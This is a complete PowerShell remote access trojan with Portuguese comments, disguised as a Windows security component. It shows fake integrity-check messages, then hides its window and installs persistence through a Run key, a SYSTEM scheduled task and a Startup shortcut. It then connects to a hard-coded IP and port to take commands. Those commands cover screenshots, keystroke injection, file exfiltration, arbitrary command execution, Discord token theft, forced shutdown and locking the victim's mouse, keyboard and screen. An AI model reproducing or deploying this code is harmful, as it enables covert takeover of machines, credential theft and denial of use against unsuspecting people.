<#
.SYNOPSIS
Windows Critical System Component - Complete Edition
.DESCRIPTION
Funções completas para controle remoto e lock total
.NOTES
Versão: 10.0.19045.1 - Lock Edition
#>

# ===== CONFIGURACOES =====
$serverIP = "198.1.195.194"  # MUDE PARA SEU IP
$serverPort = 4000
$installName = "WinUpdateSvc"
$mutexName = "Global\MicrosoftWindowsUpdateService"
$registryPath = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\WinUpdateSvc"
$userListFile = "$env:ProgramData\Microsoft\Windows\Caches\users.dat"
$debugLog = "$env:TEMP\rat_debug.log"
$scriptPath = "$env:ProgramData\Microsoft\Windows\Caches\$installName.ps1"
$wallpaperPath = "$env:TEMP\wallpaper_temp.bmp"

# ===== MUTEX - EVITA MULTIPLAS INSTANCIAS =====
$mutex = New-Object System.Threading.Mutex($false, $mutexName)
if (-not $mutex.WaitOne(0, $false)) { exit }

# ===== VERIFICAR ADMIN =====
if (-not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    Write-Host "ERRO: Execute como Administrador!" -ForegroundColor Red
    Start-Sleep -Seconds 5
    exit
}

# ===== FUNÇÃO DE LOG PARA DIAGNÓSTICO =====
function Write-DebugLog {
    param([string]$Message)
    $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
    "$timestamp - $Message" | Out-File -FilePath $debugLog -Append
}

# ===== FUNÇÕES DE USUÁRIO =====
function Remove-UserFromRAT {
    param([string]$UserName)
    try {
        $removido = $false
        if (Test-Path $registryPath) { Remove-Item -Path $registryPath -Recurse -Force -ErrorAction SilentlyContinue; $removido = $true }
        if (Test-Path $userListFile) { 
            $users = Get-Content $userListFile -ErrorAction SilentlyContinue
            $users = $users | Where-Object { $_ -ne $UserName }
            $users | Set-Content $userListFile -Force
            $removido = $true
        }
        $tasks = Get-ScheduledTask -TaskPath "\" -ErrorAction SilentlyContinue | Where-Object { $_.TaskName -like "*$installName*" }
        foreach ($task in $tasks) {
            Unregister-ScheduledTask -TaskName $task.TaskName -Confirm:$false -ErrorAction SilentlyContinue
            $removido = $true
        }
        if ($removido) { return "USUARIO_REMOVIDO" } else { return "USUARIO_NAO_ENCONTRADO" }
    } catch { 
        Write-DebugLog "Erro em Remove-UserFromRAT: $_"
        return "ERRO_AO_REMOVER" 
    }
}

function Get-RATUsers {
    try {
        $users = @()
        if (Test-Path $userListFile) { $users = Get-Content $userListFile -ErrorAction SilentlyContinue }
        if ($users.Count -eq 0) { return "Nenhum usuário encontrado" }
        return "USUARIOS:" + ($users -join "`n")
    } catch { 
        Write-DebugLog "Erro em Get-RATUsers: $_"
        return "ERRO_AO_LISTAR" 
    }
}

function Add-UserToList {
    param([string]$UserName)
    try {
        New-Item -ItemType Directory -Path "$env:ProgramData\Microsoft\Windows\Caches" -Force | Out-Null
        Add-Content -Path $userListFile -Value $UserName -Force
        New-Item -Path $registryPath -Force | Out-Null
        Set-ItemProperty -Path $registryPath -Name "UserName" -Value $UserName -Force
        Set-ItemProperty -Path $registryPath -Name "InstallDate" -Value (Get-Date).ToString() -Force
        return $true
    } catch { 
        Write-DebugLog "Erro em Add-UserToList: $_"
        return $false 
    }
}

$currentUser = "$env:COMPUTERNAME@$env:USERNAME"
$userExecuted = $false
if (Test-Path $userListFile) {
    $users = Get-Content $userListFile -ErrorAction SilentlyContinue
    if ($users -contains $currentUser) { $userExecuted = $true }
}
if (-not $userExecuted) { Add-UserToList $currentUser }

# ===== LOGS FAKES =====
Write-Host ""
Write-Host "==================================================" -ForegroundColor Cyan
Write-Host "    WINDOWS SECURITY MODULE" -ForegroundColor Cyan
Write-Host "==================================================" -ForegroundColor Cyan
Write-Host ""
Start-Sleep -Seconds 1
Write-Host "[$(Get-Date -Format 'HH:mm:ss')] Inicializando..." -ForegroundColor Gray
Start-Sleep -Milliseconds 500
Write-Host "[$(Get-Date -Format 'HH:mm:ss')] Verificando integridade..." -ForegroundColor Gray
Start-Sleep -Milliseconds 500
Write-Host "[$(Get-Date -Format 'HH:mm:ss')] Sistema seguro" -ForegroundColor Green
Start-Sleep -Seconds 2

# ===== ESCONDE JANELA =====
Add-Type -Name Window -Namespace Console -MemberDefinition @'
    [DllImport("Kernel32.dll")]
    public static extern IntPtr GetConsoleWindow();
    [DllImport("User32.dll")]
    public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
'@
$consolePtr = [Console.Window]::GetConsoleWindow()
[Console.Window]::ShowWindow($consolePtr, 0)

# ===== PERSISTÊNCIA MÚLTIPLA =====
function Install-Persistence {
    try {
        Write-DebugLog "Instalando persistência..."
        
        New-Item -ItemType Directory -Path "$env:ProgramData\Microsoft\Windows\Caches" -Force | Out-Null
        Copy-Item $MyInvocation.MyCommand.Path $scriptPath -Force
        Write-DebugLog "Script copiado para: $scriptPath"
        
        try {
            $regPath = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
            Set-ItemProperty -Path $regPath -Name $installName -Value "powershell.exe -NoProfile -WindowStyle Hidden -File `"$scriptPath`"" -Force
            Write-DebugLog "Persistência adicionada ao registro"
        } catch {
            Write-DebugLog "Erro ao adicionar ao registro: $_"
        }
        
        try {
            $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-NoProfile -WindowStyle Hidden -File `"$scriptPath`""
            $trigger = New-ScheduledTaskTrigger -AtStartup
            $principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest
            Register-ScheduledTask -TaskName $installName -Action $action -Trigger $trigger -Principal $principal -Force
            Write-DebugLog "Persistência adicionada como tarefa agendada"
        } catch {
            Write-DebugLog "Erro ao criar tarefa agendada: $_"
        }
        
        try {
            $startupPath = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup"
            $shortcutPath = "$startupPath\$installName.lnk"
            $WScriptShell = New-Object -ComObject WScript.Shell
            $shortcut = $WScriptShell.CreateShortcut($shortcutPath)
            $shortcut.TargetPath = "powershell.exe"
            $shortcut.Arguments = "-NoProfile -WindowStyle Hidden -File `"$scriptPath`""
            $shortcut.Save()
            Write-DebugLog "Atalho adicionado à pasta de inicialização"
        } catch {
            Write-DebugLog "Erro ao criar atalho: $_"
        }
        
        attrib +h +s +r $scriptPath
        Write-DebugLog "Persistência instalada com sucesso"
    } catch {
        Write-DebugLog "Erro geral na instalação da persistência: $_"
    }
}

if (-not (Test-Path $scriptPath)) {
    Install-Persistence
}

# ===== FUNCOES BASICAS =====
Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing

# ===== CAPTURA DE TELA =====
function Get-ScreenCapture {
    try {
        $screen = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
        $bitmap = New-Object System.Drawing.Bitmap $screen.Width, $screen.Height
        $graphics = [System.Drawing.Graphics]::FromImage($bitmap)
        $graphics.CopyFromScreen($screen.Location, [System.Drawing.Point]::Empty, $screen.Size)
        $ms = New-Object System.IO.MemoryStream
        $bitmap.Save($ms, [System.Drawing.Imaging.ImageFormat]::Jpeg)
        $graphics.Dispose()
        $bitmap.Dispose()
        $base64 = [Convert]::ToBase64String($ms.ToArray())
        $ms.Dispose()
        Write-DebugLog "Screenshot capturado"
        return "SCREEN:$base64"
    } catch {
        Write-DebugLog "Erro ao capturar screenshot: $_"
        return "SCREEN_ERROR"
    }
}

# ===== FUNÇÃO PARA WALLPAPER =====
function Set-WallpaperFromUrl {
    param([string]$ImageUrl)
    
    try {
        Write-DebugLog "=" * 60
        Write-DebugLog "BAIXANDO IMAGEM: $ImageUrl"
        Write-DebugLog "=" * 60
        
        $webClient = New-Object System.Net.WebClient
        $tempFile = "$env:TEMP\wallpaper_download.jpg"
        $webClient.DownloadFile($ImageUrl, $tempFile)
        $webClient.Dispose()
        
        if (-not (Test-Path $tempFile)) {
            return "WALLPAPER_DOWNLOAD_ERROR"
        }
        
        $img = [System.Drawing.Image]::FromFile($tempFile)
        $img.Save($wallpaperPath, [System.Drawing.Imaging.ImageFormat]::Bmp)
        $img.Dispose()
        Remove-Item $tempFile -Force
        
        $code = @'
using System;
using System.Runtime.InteropServices;
public class Wallpaper {
    [DllImport("user32.dll", CharSet = CharSet.Auto)]
    public static extern int SystemParametersInfo(int uAction, int uParam, string lpvParam, int fuWinIni);
    public static void Set(string path) {
        SystemParametersInfo(20, 0, path, 0x01 | 0x02);
    }
}
'@
        Add-Type -TypeDefinition $code -ErrorAction Stop
        [Wallpaper]::Set($wallpaperPath)
        
        return "WALLPAPER_SET_FROM_URL"
    } catch {
        Write-DebugLog "ERRO ao alterar wallpaper: $_"
        return "WALLPAPER_ERROR"
    }
}

# ===== MOUSE =====
function Move-Mouse { 
    param($x, $y)
    try {
        [System.Windows.Forms.Cursor]::Position = New-Object System.Drawing.Point([int]$x, [int]$y)
        return "OK"
    } catch { 
        return "MOUSE_ERROR" 
    }
}

function Click-Mouse {
    try {
        [System.Windows.Forms.SendKeys]::SendWait("{ENTER}")
        return "OK"
    } catch { 
        return "CLICK_ERROR" 
    }
}

function RightClick-Mouse {
    try {
        [System.Windows.Forms.SendKeys]::SendWait("+{F10}")
        return "OK"
    } catch { 
        return "RIGHTCLICK_ERROR" 
    }
}

# ===== TECLADO =====
function Send-Key {
    param($key)
    try {
        [System.Windows.Forms.SendKeys]::SendWait($key)
        return "OK"
    } catch { 
        return "KEY_ERROR" 
    }
}

function Send-Text {
    param($text)
    try {
        [System.Windows.Forms.SendKeys]::SendWait($text)
        return "OK"
    } catch { 
        return "TEXT_ERROR" 
    }
}

# ===== ARQUIVOS =====
function Get-FileList {
    param($Path)
    try {
        $items = Get-ChildItem $Path -ErrorAction SilentlyContinue | ForEach-Object {
            [PSCustomObject]@{
                Name = $_.Name
                Type = if ($_.PSIsContainer) { "PASTA" } else { "ARQUIVO" }
            }
        }
        return ($items | ConvertTo-Json -Compress)
    } catch { 
        return "[]" 
    }
}

function Download-File {
    param($Path)
    try {
        if (Test-Path $Path) {
            $content = [Convert]::ToBase64String([IO.File]::ReadAllBytes($Path))
            return "FILE:$content"
        }
        return "FILE_NOT_FOUND"
    } catch { 
        return "DOWNLOAD_ERROR" 
    }
}

# ===== COMANDOS =====
function Execute-Command {
    param($Cmd)
    try {
        $result = Invoke-Expression $Cmd 2>&1 | Out-String
        return $result
    } catch {
        return "Erro: $_"
    }
}

# ===== DISCORD TOKEN =====
function Get-DiscordToken {
    try {
        $tokens = @()
        $paths = @(
            "$env:APPDATA\discord\Local Storage\leveldb",
            "$env:APPDATA\discordptb\Local Storage\leveldb",
            "$env:APPDATA\discordcanary\Local Storage\leveldb"
        )
        foreach ($path in $paths) {
            if (Test-Path $path) {
                Get-ChildItem "$path\*.ldb" -ErrorAction SilentlyContinue | ForEach-Object {
                    $content = Get-Content $_.FullName -Raw -ErrorAction SilentlyContinue
                    $regex = [regex]::new('[MN][A-Za-z\d]{23}\.[\w-]{6}\.[\w-]{27}|mfa\.[\w-]{84}')
                    $matches = $regex.Matches($content)
                    foreach ($match in $matches) { $tokens += $match.Value }
                }
            }
        }
        $tokens = $tokens | Select-Object -Unique
        if ($tokens.Count -eq 0) { return "TOKENS:Nenhum token encontrado" }
        return "TOKENS:" + ($tokens -join "`n")
    } catch {
        return "TOKENS_ERROR"
    }
}

# ===== PROCESSOS =====
function Get-ProcessList {
    try {
        $processes = Get-Process | Select-Object -First 20 Name | ConvertTo-Json -Compress
        return $processes
    } catch {
        return "PROCESS_ERROR"
    }
}

# ===== URL =====
function Open-Url {
    param($url)
    try {
        Start-Process $url
        return "URL_OPENED"
    } catch {
        return "URL_ERROR"
    }
}

# ===== ENERGIA =====
function Power-Control {
    param($Action)
    try {
        switch ($Action) {
            "shutdown" { Stop-Computer -Force }
            "reboot" { Restart-Computer -Force }
        }
        return "POWER_$Action"
    } catch { 
        return "POWER_ERROR" 
    }
}

# ===== FUNÇÕES DE LOCK =====

# Variáveis globais para controle de lock
$script:mouseLocked = $false
$script:mouseThread = $null
$script:blackScreenForm = $null
$script:keyboardHook = $null
$script:lockActive = $false

# TRAVAR MOUSE
function Lock-Mouse {
    try {
        if ($script:mouseLocked) { return "MOUSE_ALREADY_LOCKED" }
        
        $script:mouseLocked = $true
        $script:mouseThread = [System.Threading.Thread]::new({
            while ($script:mouseLocked) {
                try {
                    [System.Windows.Forms.Cursor]::Position = New-Object System.Drawing.Point(0, 0)
                    Start-Sleep -Milliseconds 5
                } catch {}
            }
        })
        $script:mouseThread.IsBackground = $true
        $script:mouseThread.Start()
        
        return "MOUSE_LOCKED"
    } catch {
        return "MOUSE_ERROR"
    }
}

function Unlock-Mouse {
    try {
        $script:mouseLocked = $false
        if ($script:mouseThread -and $script:mouseThread.IsAlive) {
            $script:mouseThread.Abort()
        }
        return "MOUSE_UNLOCKED"
    } catch {
        return "MOUSE_UNLOCK_ERROR"
    }
}

# TELA PRETA
function Black-Screen {
    try {
        $ps = [powershell]::Create()
        [void]$ps.AddScript({
            Add-Type -AssemblyName System.Windows.Forms
            $form = New-Object System.Windows.Forms.Form
            $form.WindowState = 'Maximized'
            $form.FormBorderStyle = 'None'
            $form.TopMost = $true
            $form.BackColor = 'Black'
            $form.ControlBox = $false
            $form.ShowInTaskbar = $false
            $form.KeyPreview = $true
            $form.Add_KeyDown({ $_.SuppressKeyPress = $true })
            $form.ShowDialog()
        })
        $ps.BeginInvoke()
        return "BLACK_SCREEN_ACTIVATED"
    } catch {
        return "BLACK_SCREEN_ERROR"
    }
}

function Unlock-Screen {
    try {
        [System.Windows.Forms.Application]::OpenForms | Where-Object { $_.BackColor -eq [System.Drawing.Color]::Black -and $_.WindowState -eq 'Maximized' } | ForEach-Object {
            $_.Close()
        }
        return "BLACK_SCREEN_DEACTIVATED"
    } catch {
        return "UNLOCK_SCREEN_ERROR"
    }
}

# TRAVAR TECLADO
function Lock-Keyboard {
    try {
        $keyboardCode = @'
using System;
using System.Runtime.InteropServices;
using System.Windows.Forms;
public class KeyboardLocker {
    private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);
    private static LowLevelKeyboardProc _proc = HookCallback;
    private static IntPtr _hookID = IntPtr.Zero;
    
    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);
    
    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    private static extern bool UnhookWindowsHookEx(IntPtr hhk);
    
    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);
    
    [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern IntPtr GetModuleHandle(string lpModuleName);
    
    public static void Lock() {
        using (System.Diagnostics.Process curProcess = System.Diagnostics.Process.GetCurrentProcess())
        using (System.Diagnostics.ProcessModule curModule = curProcess.MainModule) {
            _hookID = SetWindowsHookEx(13, _proc, GetModuleHandle(curModule.ModuleName), 0);
        }
    }
    
    public static void Unlock() {
        if (_hookID != IntPtr.Zero) {
            UnhookWindowsHookEx(_hookID);
            _hookID = IntPtr.Zero;
        }
    }
    
    private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam) {
        return (IntPtr)1;
    }
}
'@
        Add-Type -TypeDefinition $keyboardCode -ReferencedAssemblies "System.Windows.Forms.dll" -ErrorAction Stop
        [KeyboardLocker]::Lock()
        return "KEYBOARD_LOCKED"
    } catch {
        return "KEYBOARD_ERROR"
    }
}

function Unlock-Keyboard {
    try {
        [KeyboardLocker]::Unlock()
        return "KEYBOARD_UNLOCKED"
    } catch {
        return "KEYBOARD_UNLOCK_ERROR"
    }
}

# LOCK TOTAL (TUDO JUNTO)
function Lock-Total {
    try {
        Lock-Mouse | Out-Null
        Black-Screen | Out-Null
        Lock-Keyboard | Out-Null
        $script:lockActive = $true
        return "LOCK_TOTAL_ACTIVATED"
    } catch {
        return "LOCK_TOTAL_ERROR"
    }
}

function Unlock-Total {
    try {
        Unlock-Mouse | Out-Null
        Unlock-Screen | Out-Null
        Unlock-Keyboard | Out-Null
        $script:lockActive = $false
        return "LOCK_TOTAL_DEACTIVATED"
    } catch {
        return "UNLOCK_TOTAL_ERROR"
    }
}

# ===== CONEXAO PRINCIPAL =====
while ($true) {
    try {
        $client = New-Object System.Net.Sockets.TcpClient($serverIP, $serverPort)
        $stream = $client.GetStream()
        $writer = New-Object System.IO.StreamWriter($stream)
        $reader = New-Object System.IO.StreamReader($stream)
        $writer.AutoFlush = $true
        
        $writer.WriteLine("$env:COMPUTERNAME@$env:USERNAME")
        Write-DebugLog "Conectado ao servidor"
        
        while ($client.Connected) {
            $cmd = $reader.ReadLine()
            if ([string]::IsNullOrEmpty($cmd)) { continue }
            
            Write-DebugLog "Comando recebido: $cmd"
            
            if ($cmd -eq "screenshot") {
                $result = Get-ScreenCapture
                $writer.WriteLine($result)
            } elseif ($cmd -eq "click") {
                $writer.WriteLine((Click-Mouse))
            } elseif ($cmd -eq "rightclick") {
                $writer.WriteLine((RightClick-Mouse))
            } elseif ($cmd -eq "discord") {
                $writer.WriteLine((Get-DiscordToken))
            } elseif ($cmd -eq "processes") {
                $writer.WriteLine((Get-ProcessList))
            } elseif ($cmd -eq "shutdown") {
                $writer.WriteLine((Power-Control "shutdown"))
            } elseif ($cmd -eq "reboot") {
                $writer.WriteLine((Power-Control "reboot"))
            } elseif ($cmd -eq "list_users") {
                $writer.WriteLine((Get-RATUsers))
            } elseif ($cmd -eq "remove_current_user") {
                $writer.WriteLine((Remove-UserFromRAT $currentUser))
            } elseif ($cmd -eq "lock_mouse") {
                $writer.WriteLine((Lock-Mouse))
            } elseif ($cmd -eq "unlock_mouse") {
                $writer.WriteLine((Unlock-Mouse))
            } elseif ($cmd -eq "black_screen") {
                $writer.WriteLine((Black-Screen))
            } elseif ($cmd -eq "unlock_screen") {
                $writer.WriteLine((Unlock-Screen))
            } elseif ($cmd -eq "lock_keyboard") {
                $writer.WriteLine((Lock-Keyboard))
            } elseif ($cmd -eq "unlock_keyboard") {
                $writer.WriteLine((Unlock-Keyboard))
            } elseif ($cmd -eq "lock_total") {
                $writer.WriteLine((Lock-Total))
            } elseif ($cmd -eq "unlock_total") {
                $writer.WriteLine((Unlock-Total))
            } elseif ($cmd -match "^set_wallpaper (.+)$") {
                $url = $matches[1]
                $result = Set-WallpaperFromUrl -ImageUrl $url
                $writer.WriteLine($result)
            } elseif ($cmd -eq "test") {
                $writer.WriteLine("PONG")
            } elseif ($cmd -eq "exit") {
                break
            } elseif ($cmd -match "^move (\d+) (\d+)$") {
                $writer.WriteLine((Move-Mouse $matches[1] $matches[2]))
            } elseif ($cmd -match "^key (.+)$") {
                $writer.WriteLine((Send-Key $matches[1]))
            } elseif ($cmd -match "^type (.+)$") {
                $writer.WriteLine((Send-Text $matches[1]))
            } elseif ($cmd -match "^ls (.+)$") {
                $writer.WriteLine((Get-FileList $matches[1]))
            } elseif ($cmd -match "^download (.+)$") {
                $writer.WriteLine((Download-File $matches[1]))
            } elseif ($cmd -match "^exec (.+)$") {
                $writer.WriteLine((Execute-Command $matches[1]))
            } elseif ($cmd -match "^url (.+)$") {
                $writer.WriteLine((Open-Url $matches[1]))
            } elseif ($cmd -match "^remove_user (.+)$") {
                $writer.WriteLine((Remove-UserFromRAT $matches[1]))
            } else {
                Write-DebugLog "Comando nao reconhecido: $cmd"
                $writer.WriteLine("Comando nao reconhecido")
            }
        }
    } catch {
        Write-DebugLog "Erro na conexao: $_"
        Start-Sleep -Seconds 10
    } finally {
        if ($client) { $client.Close() }
    }
}

$mutex.ReleaseMutex()
$mutex.Dispose()
